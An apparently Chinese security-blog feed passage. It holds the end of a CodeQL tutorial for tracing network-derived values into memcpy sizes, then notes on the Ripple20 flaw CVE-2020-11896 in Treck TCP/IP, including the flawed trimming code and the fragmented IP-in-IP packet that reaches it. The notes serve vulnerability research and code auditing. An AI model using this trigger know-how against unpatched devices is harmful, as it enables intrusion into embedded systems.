class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line"></span><br><span class="line">from Function f</span><br><span class="line">where f.getName() &#x3D; &quot;strlen&quot;</span><br><span class="line">select f, &quot;a function named strlen&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>右键点击运行，效果如下</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910173438.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910173438.png"></a></p><p>其中第三个是关于 <code>strlen</code> 的定义，</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910173541.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910173541.png"></a></p><h3 id="0x2-查找特定宏定义"><a href="#0x2-查找特定宏定义" class="headerlink" title="0x2 查找特定宏定义"></a>0x2 查找特定宏定义</h3><p>但是在 c 代码里， 有些情况我们需要查找宏的定义，这个时候就需要使用 <code>Macro</code> 这个 Predicates， 例如样例里提到的 <code>ntohs</code> 族，函数</p><!--**`ntohl`，`ntohll`和`ntohs`可以是函数或宏（取决于其中的代码被编译在平台上）。**--><p>另外， QL 语言支持正则匹配，我们可以通过 <code>regexpMatch</code> 匹配一类函数例如如下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line"></span><br><span class="line">from Macro m</span><br><span class="line">where m.getName().regexpMatch(&quot;ntoh(s|l|ll)&quot;)</span><br><span class="line">select m</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="0x3-函数的调用"><a href="#0x3-函数的调用" class="headerlink" title="0x3 函数的调用"></a>0x3 函数的调用</h3><p>在代码审计的场景里，我们在查找函数定义的同时，也需要根据函数调用查找完整的数据流，在 CodeQL 里，函数的调用通过 <code>FunctionCall</code> 这个 Predicates 可以直接完成，例如如下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from FunctionCall c</span><br><span class="line">where c.getTarget().getName() &#x3D; &quot;memcpy&quot;</span><br><span class="line">select c</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910174736.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910174736.png"></a></p><h3 id="0x04-宏定义的调用"><a href="#0x04-宏定义的调用" class="headerlink" title="0x04 宏定义的调用"></a>0x04 宏定义的调用</h3><p>查找宏定义的的调用，使用 <code>MacroInvocation</code> 完成，代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from MacroInvocation mi</span><br><span class="line">where mi.getMacro().getName().regexpMatch(&quot;ntoh(s|l|ll)&quot;)</span><br><span class="line">select mi</span><br></pre></td></tr></table></figure><h3 id="0x05-获取-ntohs-族宏定义的表达式"><a href="#0x05-获取-ntohs-族宏定义的表达式" class="headerlink" title="0x05 获取 ntohs 族宏定义的表达式"></a>0x05 获取 ntohs 族宏定义的表达式</h3><p>在 0x04 中，我们提到了宏定义的调用，另外我们知道， <code>ntoh</code> 族函数，通常用来进行网络字节序到主机字节序的转换，通常而言，如果是一个网络协议，我们可能会从某个字段中取出某个特定的值，并且赋值给某个变量，这个时候我们就需要获取他们的表达式。</p><p>这里以表达式出现的话，我们可以使用 <code>getExpr()</code>函数完成，仅仅只需要将 <code>select mi</code> 修改为 <code>select mi.getExpr()</code> ，效果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line"></span><br><span class="line">from MacroInvocation mi</span><br><span class="line">where mi.getMacro().getName().regexpMatch(&quot;ntoh(s|l|ll)&quot;)</span><br><span class="line">select mi.getExpr()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910175832.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910175832.png"></a></p><p>例如这里的赋值语句就是第 78 个表达式</p><h3 id="0x06-编写一个-QL-类"><a href="#0x06-编写一个-QL-类" class="headerlink" title="0x06 编写一个 QL 类"></a>0x06 编写一个 QL 类</h3><p>QL 类包括三个部分</p><ol><li>关键字<code>class</code>。</li><li>类的名称。这是一个 以大写字母开头的<a href="https://help.semmle.com/QL/ql-spec/language.html#identifiers">标识符</a>。</li><li>要扩展的类型。</li><li><a href="https://help.semmle.com/QL/ql-handbook/types.html#class-bodies">类</a>的<a href="https://help.semmle.com/QL/ql-handbook/types.html#class-bodies">主体</a>，用大括号括起来。</li></ol><p>更多关于类的编写可以参考 <a href="https://help.semmle.com/QL/ql-handbook/types.html#classes">https://help.semmle.com/QL/ql-handbook/types.html#classes</a></p><p>这里我们需要编写尝试编写一个 <code>NetworkByteSwap</code> 的类</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * An expression involved when swapping the byte order of network data.</span><br><span class="line"> * Its value is likely to have been read from the network.</span><br><span class="line"> *&#x2F;</span><br><span class="line">class NetworkByteSwap extends Expr &#123;</span><br><span class="line">  NetworkByteSwap() &#123;</span><br><span class="line">    exists(MacroInvocation mi |</span><br><span class="line">      mi.getMacroName().regexpMatch(&quot;ntoh(s|l|ll)&quot;) and</span><br><span class="line">      this &#x3D; mi.getExpr()</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from NetworkByteSwap n</span><br><span class="line">select n</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="0x07-数据流分析"><a href="#0x07-数据流分析" class="headerlink" title="0x07 数据流分析"></a>0x07 数据流分析</h3><p>现在我们来开始做数据流分析，<strong>通过定义源和接收器来创建<a href="https://help.semmle.com/qldoc/cpp/semmle/code/cpp/dataflow/TaintTracking.qll/type.TaintTracking$TaintTracking$Configuration.html">配置</a>类。</strong> 来源应该是调用<code>ntohl</code>，<code>ntohll</code>或<code>ntohs</code>。该接收器应为不安全调用memcpy的size参数。通过查找此类的数据流判断是否存在安全问题</p><p>这里需要使用 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import semmle.code.cpp.dataflow.TaintTracking</span><br><span class="line">import DataFlow::PathGraph</span><br></pre></td></tr></table></figure><p>两个新库，然后我们要设置 来源和 Sink 的对象。</p><p>首先设置来源：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSource(DataFlow::Node source) &#123; source.asExpr() instanceof NetworkByteSwap &#125;</span><br></pre></td></tr></table></figure><p>设置来源对象为 表达式，是 <code>NetworkByteSwap</code> 这个类的值，<code>NetworkByteSwap</code> 这个类在 0x06 定义</p><p>然后设置接收器，接收器为 <code>memcpy</code> 的size 参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">  exists(FunctionCall c | c.getTarget().getName() &#x3D; &quot;memcpy&quot; and sink.asExpr() &#x3D; c.getArgument(2))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完整代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line">import semmle.code.cpp.dataflow.TaintTracking</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * An expression involved when swapping the byte order of network data.</span><br><span class="line"> * Its value is likely to have been read from the network.</span><br><span class="line"> *&#x2F;</span><br><span class="line">class NetworkByteSwap extends Expr &#123;</span><br><span class="line">  NetworkByteSwap() &#123;</span><br><span class="line">    exists(MacroInvocation mi |</span><br><span class="line">      mi.getMacroName().regexpMatch(&quot;ntoh(s|l|ll)&quot;) and</span><br><span class="line">      this &#x3D; mi.getExpr()</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Config extends TaintTracking::Configuration &#123;</span><br><span class="line">  Config() &#123; this &#x3D; &quot;Config: this name doesn&#39;t matter&quot; &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123; source.asExpr() instanceof NetworkByteSwap &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    exists(FunctionCall c | c.getTarget().getName() &#x3D; &quot;memcpy&quot; and sink.asExpr() &#x3D; c.getArgument(2))</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from Config cfg, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where cfg.hasFlowPath(source, sink)</span><br><span class="line">select sink, source, sink, &quot;Network byte swap flows to memcpy&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>效果如下</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910183515.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200910183515.png"></a></p><p>其中有多个明显的缓冲区溢出漏洞</p><h2 id="使用CodeQL-进行-0day-挖掘"><a href="#使用CodeQL-进行-0day-挖掘" class="headerlink" title="使用CodeQL 进行 0day 挖掘"></a>使用CodeQL 进行 0day 挖掘</h2><p>我们通过  CodeQL 编写了一个 ntoh -&gt; memcpy 的数据流追踪，当我们通过检查相应的代码我们即可分析是否有缓冲区溢出风险。我们学习了差不多了，我们可以通过这个成型的查询来查询一些类似这样的安全问题。</p><p>例如我通过这个查询，挖掘了两个缓冲区溢出漏洞: CVE-2020-28194 和 CVE-2020-15173</p><p>大家也可以去尝试尝试。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="Summary" scheme="https://bestwing.me/categories/Summary/"/>
    
    
    <category term="codeql" scheme="https://bestwing.me/tags/codeql/"/>
    
  </entry>
  
  <entry>
    <title>关于 CVE-2020-11896和CVE-2020-11898 的学习笔记</title>
    <link href="https://bestwing.me/Ripple20-overview.html"/>
    <id>https://bestwing.me/Ripple20-overview.html</id>
    <published>2020-06-29T16:00:00.000Z</published>
    <updated>2020-07-02T13:42:21.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>学习了一下这 ripper 20的两个洞</p><h2 id="CVE-2020-11896"><a href="#CVE-2020-11896" class="headerlink" title="CVE-2020-11896"></a>CVE-2020-11896</h2><h3 id="IPv4-分片"><a href="#IPv4-分片" class="headerlink" title="IPv4 分片"></a>IPv4 分片</h3><p>IP分片使得即使在IP分组的大小大于网络的特定链路中允许的最大大小的情况下，也可以在网络中发送IP分组。IP分段是一种将分组分成几个较小部分(“片段”)以支持在这些链路和网络上传输的技术。该协议支持TH分组的分段然后重组。</p><p>使用IP报头中的标识字段将不同的片段分组。该标识字段描述片段属于哪个分组。这允许不同的数据包在网络中分段传输，并在另一端正确重组。最后一个片段的MF(更多片段)位标志设置为0，而所有其他片段的MF=1。</p><p>网络堆栈负责对大型数据包进行分段，并通过网络发送多个分段。请求发送大型数据报的UDP应用程序就是一个例子。网络堆栈还负责在接收到分段的数据包时对其进行重组。</p><p>如果只有部分数据包碎片到达，网络堆栈最终会丢弃这些碎片。在大多数实现中，当处理任何片段时，网络堆栈启动计时器。当该计时器到期时，网络堆栈丢弃属于同一标识组的所有片段。</p><p>IPv4通过Flags及Fragment Offset字段对分片进行管理，Flags由R、DF、MF三部分组成：</p><p>● R（Reserve bit）保留未用</p><p>● DF (Don’t Fragment) DF =1：禁止分片 , DF =0：允许分片</p><p>● MF (More Fragment) MF =1：非最后一片, MF =0：最后一片(或未分片)</p><p>Fragment Offset(13位)：一个IP分组分片封装原IP分组数据的相对偏移量, 片偏移字段以8字节为单位。IP包结构如下图所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> 0                   1                   2                   3</span><br><span class="line"> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|Version|  IHL  |Type of Service|          Total Length         |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|         Identification        |Flags|      Fragment Offset    |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|  Time to Live |    Protocol   |         Header Checksum       |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                       Source Address                          |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                    Destination Address                        |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                    Options                    |    Padding    |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><h3 id="IP-隧道"><a href="#IP-隧道" class="headerlink" title="IP 隧道"></a>IP 隧道</h3><p>IP隧道允许两个独立网络之间的虚拟点对点链路。它是通过将一个数据包(可以是IP数据包)封装在另一个数据包中来实现的，从而使内部数据包具有与外部数据包不同的源地址和目的地址。</p><p>外部数据包的源地址和目的地址是隧道端点，内部数据包中的地址用于隧道两端的网络路由。<br>隧道入口点是接收应该通过隧道转发的IP分组的节点。它将此数据包封装在外部IP数据包中。当数据包到达隧道出口点时，会将其解封并转发，就好像它是在目标网络中发送的常规数据包一样。<br>隧道使用的一个主要示例是虚拟专用网(VPN)技术。<br>有几种隧道协议，最简单、最古老的协议之一是IP-in-IP(IP协议号4)。</p><h4 id="IP-in-IP"><a href="#IP-in-IP" class="headerlink" title="IP-in-IP"></a>IP-in-IP</h4><p>IP-in-IP是一种IP隧道协议，在该协议中，通过添加具有分别等于隧道入口点和出口点的源地址和目的地址的外部IP报头，将一个IP数据包封装在另一个IP数据包中。<br>内部数据包未修改，外部IP报头从内部IP报头复制一些字段。外部标头的IP协议号为4。</p><h3 id="Treck-TCP-IP"><a href="#Treck-TCP-IP" class="headerlink" title="Treck TCP/IP"></a>Treck TCP/IP</h3><p>在 Treck TCP/IP 中，有个结构体用来描述其 TCP/IP栈，称为tsPacket。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tsPacket</span> &#123;</span></span><br><span class="line">ttUserPacket pktUserStruct;</span><br><span class="line">ttSharedDataPtr pktSharedDataPtr; <span class="comment">// Point to corresponding sharable ttSharedData struct tsPacket * pktChainNextPtr; // Next packet (head of a new datagram in a queue) struct tsDeviceEntry * pktDeviceEntryPtr; // pointer to network Device struct</span></span><br><span class="line"><span class="keyword">union</span> anon_union_for_pktPtrUnion pktPtrUnion; tt32Bit pktTcpXmitTime;</span><br><span class="line">tt16Bit pktUserFlags; tt16Bit pktFlags; tt16Bit pktFlags2;</span><br><span class="line">tt16Bit pktMhomeIndex;</span><br><span class="line">tt8Bit pktTunnelCount; <span class="comment">// Number of times this packet has been decapsulated. Initially set</span></span><br><span class="line">tt8Bit pktIpHdrLen; <span class="comment">// Number of bytes occupied by the IP header.</span></span><br><span class="line">tt8Bit pktNetworkLayer; <span class="comment">// Specifies the network layer type of this packet (IPv4, IPv6,</span></span><br><span class="line">‹→ ARP, etc).</span><br><span class="line">tt8Bit pktFiller[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这是包含的ttUserPacket 结构（tsUserPacket的typedef ）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tsUserPacket</span> &#123;</span></span><br><span class="line"><span class="keyword">void</span> * pktuLinkNextPtr; <span class="comment">// Next tsUserPacket for fragmented data</span></span><br><span class="line">ttUser8BitPtr pktuLinkDataPtr; <span class="comment">// Pointer to data</span></span><br><span class="line">ttPktLen pktuLinkDataLength; <span class="comment">// Size of data pointed by pktuLinkDataPtr</span></span><br><span class="line">ttPktLen pktuChainDataLength; <span class="comment">// Total packet length (of chained fragmented data). Valid</span></span><br><span class="line">‹→ in first link only.</span><br><span class="line"><span class="keyword">int</span> pktuLinkExtraCount; <span class="comment">// Number of links linked to this one (not including this one).</span></span><br><span class="line">‹→ Valid in first link only.</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>pktuLinkDataPtr 指向当前片段的数据缓冲区。随着网络堆栈在不同阶段处理数据包并取决于当前正在处理的数据包层 ，此数据缓冲区内的确切位置会发生变化。 对于 例如，当网络栈处理所述以太网层（在tfEtherRecv ），该字段指向以太网报头。</p><p>pktuLinkDataLength字段指定pktuLinkDataPtr指向的数据的大小，即单个片段的大小。<br>pktuLinkNextPtr用于跟踪数据包中的片段。此字段指向表示下一个片段的另一个tsPacket，该片段又包含对下一个片段的引用，依此类推。因此，我们也可以在此链表中将片段称为“链接”。如果此链接是最后一个片段，或者如果数据未分段，则此字段将等于NULL。<br>pktuChainDataLength字段表示包括所有片段的分组长度，即分组的总大小。它只为第一个片段设置，如果数据没有分段，则等于pktuLinkDataLength。</p><p>堆栈中的一种常见模式是在堆栈中的各层之间移动时调整pktuLinkDataPtr指针。例如，如果我们的数据包是ICMP回应请求数据包(PING)，则它将由三层组成：以太网，然后是IPv4，最后是ICMP。在这种情况下，当以太网层被处理时(在函数tfEtherRecv中)，pktuLinkDataPtr指向以太网头的开始，然后在移动到下一层之前，使用以下代码对其进行调整：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pkt-&gt;pktuLinkDataPtr = pkt-&gt;pktuLinkDataPtr + <span class="number">0xe</span>;</span><br><span class="line">pkt-&gt;pktuLinkDataLength = pkt-&gt;pktuLinkDataLength - <span class="number">0xe</span>; </span><br><span class="line">pkt-&gt;pktuChainDataLength = pkt-&gt;pktuChainDataLength - <span class="number">0xe</span>;</span><br></pre></td></tr></table></figure><p>在本例中，0xE(十进制14)是以太网头的大小(6(Dst MAC)+6(Src MAC)+2(EtherType))。<br>当tfEtherRecv完成数据包处理时，它会使用代表下一层协议的EtherType字段将数据包转发到下一层处理。遇到的支持的以太网类型有ARP、IPv4和IPv6。</p><a href="https://lh4.googleusercontent.com/hELEgQOjkR6bZJsVt5BABrxheHT47maZrgrlrQQ_et0IyFebfxL1JhnUHtdEE-0TWN92dxV5i4AYbKqUru0fVz12lAyXlf0V-5fvHLepAWkJQSt8T-pO79BdoW6UZ821xxMUOpA" title="img" class="gallery-item"><img src="https://lh4.googleusercontent.com/hELEgQOjkR6bZJsVt5BABrxheHT47maZrgrlrQQ_et0IyFebfxL1JhnUHtdEE-0TWN92dxV5i4AYbKqUru0fVz12lAyXlf0V-5fvHLepAWkJQSt8T-pO79BdoW6UZ821xxMUOpA" alt="img" style="zoom:50%;" /></a><p>在此的示例中，当IPv4层接收到数据包(在函数tfIpIncomingPacket中)时，指针pktuLinkDataPtr已经指向以太网头，因此可以安全地假设pktuLinkDataPtr指向的数据是IPv4头。<br>传入的数据由具有相同命名约定TF<em>IncomingPacket的函数处理(正如我们已经看到的)，其中</em>是协议名称。在以太网/IPv4/ICMP的情况下，包将由函数tfEtherRecv、tfIpIncomingPacket处理。<br>和tfIcmpIncomingPacket。<br>Treck堆栈处理从tfIpIncomingPacket调用的过程tfIpReAssemblePacket中的片段重组。每当接收到发往设备的IP片段时，都会调用此过程。如果缺少片段，则函数返回NULL。否则，如果所有片段都到达并且没有漏洞，则网络堆栈使用pktuLinkNextPtr字段将片段链接在一起，并传递数据包以供下一层进一步处理。在此上下文中的单词“重组”并不意味着将分组复制到连续的存储块，而是简单地将它们链接在一个链表中。</p><h3 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h3><p>为了了解漏洞的根本原因，我们将快速查看IP标头中的两个字段：</p><p><em>•</em> IHL （4个比特）：该尺寸的所述IP 报头中的双字。最低值是5 （20 个字节）。如果有IP选项，头长度变大，最多值的0xf（60个字节）。  </p><p><em>•</em> 总长度（2个字节）：整个IP数据包的大小，以字节（或IP片段，如果是分段的）为单位，包括报头。  </p><p>函数tfIpIncomingPacket 从一些基本的健全性检查开始。除了验证标头校验和之外，它还验证：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip_version &#x3D;&#x3D; 4 &amp;&amp; data_available &gt;&#x3D; 21 &amp;&amp; header_length &gt;&#x3D; 20 &amp;&amp; total_length &gt; header_length &amp;&amp; total_length &lt;&#x3D; data_available</span><br></pre></td></tr></table></figure><p>“可用数据”是使用字段pktuChainDataLength测量的。<br>如果所有健全性检查都通过，该函数将检查IP报头中指定的总长度是否严格小于数据包的pktuChainDataLength，表明实际接收的数据多于IP报头中所述的数据。如果为真，则执行修剪操作以删除额外数据：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((uint)ipTotalLength &lt;= pkt-&gt;pktuChainDataLength) &#123; <span class="keyword">if</span> ((uint)ipTotalLength != pkt-&gt;pktuChainDataLength) &#123;</span><br><span class="line">pkt-&gt;pktuChainDataLength = (uint)ipTotalLength; </span><br><span class="line">pkt-&gt;pktuLinkDataLength = (uint)ipTotalLength;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这就是漏洞所在。回想一下，pktuLinkDataLength保存当前片段的大小，pktuChainDataLength保存整个数据包的大小。如果执行上述操作，则会创建不一致，其中pkt-&gt;pktuChainDataLength。<br>==pkt-&gt;pktuLinkDataLength，但可能有其他片段指向。<br>pkt-&gt;pktuLinkNextPtr.。另一种方式是将其视为一种虚构的不一致状态，其中链表上片段的总大小大于pktuChainDataLength中存储的大小。<br>由弱修剪操作产生的不一致对于处理的其余部分来说不是好兆头。然而，我们还有另一个挑战需要克服。每次使用一个接收到的片段调用tfIpIncomingPacket函数，并调用tfIpReAssemblePacket来处理它。tfIpReAssemblePacket负责将片段插入到上述链表中。它不会将片段复制到连续的内存缓冲区。收到所有片段后，tfIpReAssemblePacket以片段链接列表的形式返回完整的数据包，以便在下一个协议层进行进一步处理。该重组操作在易受攻击的修剪操作之后执行。一旦可靠的操作完成，tfIpIncomingPacket将返回或转发数据包，以便在下一网络层(例如：UDP)进行处理。这会阻止我们执行利用漏洞攻击，因为我们需要分段的数据包才能达到不一致的状态。换句话说，易受攻击的代码应该只在每个片段的基础上执行(或在单个片段的数据包上执行)。如果以这种方式执行，它实际上并不容易受到攻击。<br>那么，我们如何才能用传入的碎片数据触发易受攻击的修剪流，从而实现上述不一致呢？</p><h4 id="在IP层处理分段数据包"><a href="#在IP层处理分段数据包" class="headerlink" title="在IP层处理分段数据包"></a>在IP层处理分段数据包</h4><p>为了使分段的数据包在IP层得到处理并到达易受攻击的流，我们使用隧道。<br>隧道允许tfIpIncomingPacket将内部IP数据包作为非分段数据包进行处理。函数tfIpIncomingPacket将被递归调用两次，一次用于IP隧道的内层，多次用于外层(每个片段一次)。首先，tfIpIncomingPacket将接收来自外层的所有片段，在每个片段上调用tfIpReAssemblePacket，一旦它们都被接收，它将把执行传递到下一个协议层，在本例中再次是IPv4，因此将从具有内部IP层的tfIpIncomingPacket调用tfIpIncomingPacket。</p><p><a href="https://lh5.googleusercontent.com/xX_OIWoDTddPFXkKXpjKXd5tROmOlFf7V-xipWAHODKoI1Ke_dk23YSytZYHTHZ50I67C4hCKqbHbQzaGBKXi5u24BTDy_ulnsLTbgHyKxXtKB0UfS8Yec-Jz01QcISgvik_I5Y" title="img" class="gallery-item"><img src="https://lh5.googleusercontent.com/xX_OIWoDTddPFXkKXpjKXd5tROmOlFf7V-xipWAHODKoI1Ke_dk23YSytZYHTHZ50I67C4hCKqbHbQzaGBKXi5u24BTDy_ulnsLTbgHyKxXtKB0UfS8Yec-Jz01QcISgvik_I5Y" alt="img"></a></p><p>对外部IP分组进行分段会导致使用内部分组调用tfIpIncomingPacket，该内部分组现在由几个分段组成，但在IP报头中标记为未分段(MF=0)。就描述数据包的数据结构而言，它现在由链接列表中的几个单独的链接组成，每个链接都有一个单独的pktuLinkDataLength值。</p><p>让我们说得更具体些。请考虑下面的示例，它将伴随我们完成本文：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200630192657.png" title="image-20200630192655708" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200630192657.png" alt="image-20200630192655708"></a></p><p>(我们将 checksum 字段设置为0，因为这将导致跳过UDP校验和验证。)。<br>当网络堆栈处理外部片段时，它使用字段将它们链接起来。<br>如前所述，tsUserPacket结构中的pktuLinkNextPtr。当函数tfIpIncomingPacket处理内部IP包(由于协议=4)时，它正在处理传入的分片数据(内部IP包由两个链接在一起的tsPacket结构表示)，但仍会调用易受攻击的流，从而解决了我们的挑战。<br>此外，内部IP分组通过IP报头健全性检查，因为只考虑tsUserPacket的pktuChainDataLength字段(而不是pktuLinkDataLength)。在我们的示例中，内部IP数据包(32)的总长度较小。<br>超过链数据长度(1000+8+20=1028)，因此Treck堆栈将通过将字段pktuLinkDataLength和pktuChainDataLength设置为相同的值-总IP长度(在我们的示例中为32)，来尝试不正确地修剪数据包。这导致内部IP分组由链接在一起的两个tsPacket结构表示，但是它们的总CUSIZE大于pktuChainDataLength字段(pktuChainDataLength字段在修整后等于32，而不是1028字节)。</p><p><a 